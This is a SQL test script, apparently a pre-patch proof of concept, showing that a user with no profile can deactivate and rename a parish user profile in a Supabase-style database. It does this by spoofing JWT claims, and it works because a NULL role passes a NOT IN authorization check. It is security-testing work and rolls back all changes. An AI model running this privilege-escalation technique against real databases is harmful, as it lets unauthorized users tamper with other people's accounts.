-- V181 prepatch: authenticated identity WITHOUT ANY user_profiles can disable or
-- reassign a fictional parish profile due to NULL NOT IN ('admin_general','diocese').
-- All identities/record updates rollback. Do not use real target profile.
BEGIN;
DO $fixture$
DECLARE rogue uuid:=gen_random_uuid(); victim uuid:=gen_random_uuid(); p uuid; di uuid; target uuid;
BEGIN
 SELECT id,diocese_id INTO STRICT p,di FROM public.parishes WHERE diocese_id IS NOT NULL ORDER BY id LIMIT 1;
 INSERT INTO auth.users(id,instance_id,aud,role,email,created_at,updated_at)
 VALUES(rogue,'00000000-0000-0000-0000-000000000000','authenticated','authenticated','qa-v181-profileless-'||rogue||'@example.invalid',now(),now()),
 (victim,'00000000-0000-0000-0000-000000000000','authenticated','authenticated','qa-v181-victim-'||victim||'@example.invalid',now(),now());
 DELETE FROM public.user_profiles WHERE auth_user_id=rogue;
 IF EXISTS(SELECT 1 FROM public.user_profiles WHERE auth_user_id=rogue) THEN RAISE EXCEPTION 'V181 rogue must have no profile';END IF;
 INSERT INTO public.user_profiles(auth_user_id,role,diocese_id,parish_id,is_active,status)
 VALUES(victim,'parish',di,p,true,'ACTIVE') RETURNING id INTO target;
 PERFORM set_config('qa181.rogue',rogue::text,true);
 PERFORM set_config('qa181.target',target::text,true);
 PERFORM set_config('qa181.parish',p::text,true);
END $fixture$;
SET LOCAL ROLE authenticated;
DO $exploit$
DECLARE actor uuid:=current_setting('qa181.rogue')::uuid;
 target uuid:=current_setting('qa181.target')::uuid;
 p uuid:=current_setting('qa181.parish')::uuid;
 returned_id uuid; current_active boolean; changed_name text;
BEGIN
 PERFORM set_config('request.jwt.claim.sub',actor::text,true);
 PERFORM set_config('request.jwt.claims',jsonb_build_object('sub',actor,'role','authenticated')::text,true);
 IF public.current_app_role() IS NOT NULL THEN RAISE EXCEPTION 'V181 role must be NULL without profile';END IF;
 SELECT id,is_active INTO returned_id,current_active
 FROM public.set_managed_user_active(target,false);
 IF returned_id IS DISTINCT FROM target OR current_active IS DISTINCT FROM false
 THEN RAISE EXCEPTION 'V181 no-profile actor unable to execute prohibited deactivation';END IF;
 SELECT username INTO changed_name FROM public.update_managed_user_profile(target,'QA-V181-UNAUTHORIZED-EDIT',p,NULL::uuid);
 IF changed_name IS DISTINCT FROM 'QA-V181-UNAUTHORIZED-EDIT'
 THEN RAISE EXCEPTION 'V181 no-profile actor unable to execute prohibited profile edit';END IF;
 RAISE NOTICE 'V181_PREPATCH_PROFILELESS_AUTH_USER_DISABLED_AND_REASSIGNED_FAKE_PARISH_PROFILE';
END $exploit$;
ROLLBACK;